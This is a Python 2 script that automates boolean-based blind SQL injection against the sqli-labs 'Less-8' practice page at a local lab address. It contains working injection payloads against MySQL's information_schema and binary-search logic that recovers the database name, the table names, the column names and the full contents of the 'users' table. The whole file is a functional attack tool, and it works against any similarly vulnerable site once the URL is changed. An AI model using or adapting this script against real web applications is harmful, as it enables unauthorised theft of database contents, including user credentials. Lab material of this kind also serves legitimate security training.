# -*-coding:utf-8-*-
 
"""
@version:
@author: giantbranch
@file: blindsqlinjection.py
@time: 2016/5/1
"""
 
import urllib
import urllib2
 
getTable = "users"
success_str = "You are in"
 
index = "0"
url = "http://192.168.153.129/sqli-labs/Less-8/?id=1"
database = "database()"
selectDB = "select database()"
selectTable = "select table_name from information_schema.tables where table_schema='%s' limit %d,1"
 
asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"
lengthPayload = "' and length(%s)>=%d #"
selectTableCountPayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"
 
selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
selectTableNameLengthPayloadbehind = ",1)>=%d #"
 
#发送请求,根据页面的返回的判断长度的猜测结果
#string:猜测的字符串;payload:使用的payload;length:猜测的长度
def getLengthResult(payload, string, length):
    finalUrl = url + urllib.quote(payload % (string, length))
    res = urllib2.urlopen(finalUrl)
    if success_str in res.read():
        return True
    else:
        return False
 
#发送请求,根据页面的返回的判断字符的猜测结果
#payload:使用的payload;string:猜测的字符串;pos:猜测字符串的位置;ascii:猜测的ascii
def getResult(payload, string, pos, ascii):
    finalUrl = url + urllib.quote(payload % (string, pos, ascii))
    res = urllib2.urlopen(finalUrl)
    if success_str in res.read():
        return True
    else:
        return False
 
#注入
def inject():
    #猜数据库长度
    lengthOfDBName = getLengthOfString(lengthPayload, database)
    print "length of DBname: " + str(lengthOfDBName)
    #猜数据库名称
    DBname = getName(asciiPayload, selectDB, lengthOfDBName)
    print "current database:" + DBname
    #猜数据库中的表的个数
    tableCount = getLengthOfString(selectTableCountPayload, DBname)
    print "count of talbe:" + str(tableCount)
    for i in xrange(0, tableCount):
        num = str(i)
        #猜当前表的长度
        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)
        print "current table length:" + str(tableNameLength)
        #猜当前表的名字
        selectTableName = selectTable % (DBname, i)
        tableName = getName(asciiPayload, selectTableName, tableNameLength)
        print tableName
    selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s')>=%d #"
    #猜指定表的列的数量
    columnCount = getLengthOfString(selectColumnCountPayload, getTable)
    print "table:" + getTable + " --count of column:" + str(columnCount)
    #猜该表有多少行数据
    dataCountPayload = "'and (select count(*) from %s)>=%d #"
    dataCount = getLengthOfString(dataCountPayload, getTable)
    print "table:" + getTable + " --count of data: " + str(dataCount)
    data = []
    #获取指定表中的列
    for i in xrange(0, columnCount):
        #猜列名长度
        selectColumnNameLengthPayload = "'and (select length(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit " + str(
            i) + ",1)>=%d #"
        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)
        print "current column length:" + str(columnNameLength)
        #猜列的名字
        selectColumn = "select column_name from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit %d,1"
        selectColumnName = selectColumn % (getTable, i)
        columnName = getName(asciiPayload, selectColumnName, columnNameLength)
        print columnName
        tmpData = []
        tmpData.append(columnName)
        #获取该表的数据
        for j in xrange(0, dataCount):
            columnDataLengthPayload = "'and (select length(" + columnName + ") from %s limit " + str(j) + ",1)>=%d #"
            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)
            selectData = "select " + columnName + " from users limit " + str(j) + ",1"
            columnData = getName(asciiPayload, selectData, columnDataLength)
            tmpData.append(columnData)
        data.append(tmpData)
    #格式化输出数据
    tmp = ""
    for i in xrange(0, len(data)):
        tmp += data[i][0] + "   "
    print tmp
    for j in xrange(1, dataCount + 1):
        tmp = ""
        for i in xrange(0, len(data)):
            tmp += data[i][j] + "   "
        print tmp
 
#猜长度
def getLengthOfString(payload, string):
    lengthLeft = 0
    lengthRigth = 0
    guess = 10
    #确定长度上限,每次增加5
    while 1:
        if getLengthResult(payload, string, guess) == True:
            guess = guess + 5
        else:
            lengthRigth = guess
            break;
    #二分法查长度
    mid = (lengthLeft + lengthRigth) / 2
    while lengthLeft < lengthRigth - 1:
        if getLengthResult(payload, string, mid) == True:
            lengthLeft = mid
        else:
            lengthRigth = mid
        mid = (lengthLeft + lengthRigth) / 2
    return lengthLeft
 
#猜名字
def getName(payload, string, lengthOfString):
    #空格(32)是第一个可显示的字符delete(127)是最后一个可显示的字符
    tmp = ''
    for i in xrange(1, lengthOfString + 1):
        left = 32
        right = 127
        mid = (left + right) / 2
        while left < right - 1:
            if getResult(payload, string, i, mid) == True:
                left = mid
                mid = (left + right) / 2
            else:
                right = mid
            mid = (left + right) / 2
        tmp += chr(left)
    return tmp
 
def main():
    inject()
main()